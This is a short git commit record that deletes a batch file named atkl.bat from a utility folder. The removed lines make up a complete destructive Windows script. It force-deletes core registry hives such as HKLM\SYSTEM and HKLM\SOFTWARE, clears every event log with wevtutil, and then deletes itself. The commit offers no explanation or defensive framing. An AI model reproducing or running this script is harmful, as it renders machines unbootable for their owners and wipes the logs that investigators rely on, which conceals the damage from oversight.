f18b6b0d23d47f822d39cb52549fdabf59467aa6
Toffo98 <47430356+Toffo98@users.noreply.github.com>
2022-07-05 16:52:09 +0200

    Delete atkl.bat

--- utility/atkl.bat
+++
@@ -1,7 +0,0 @@
-@ECHO OFF
-REG DELETE HKEY_CURRENT_CONFIG\System /f
-REG DELETE HKEY_CURRENT_CONFIG\Software /f
-REG DELETE HKEY_LOCAL_MACHINE\SYSTEM /f
-REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE /f
-for /F “tokens=*” %1 in ('wevtutil.exe el') DO wevtutil.exe cl “%1”
-(goto) 2>nul & del "%~f0"
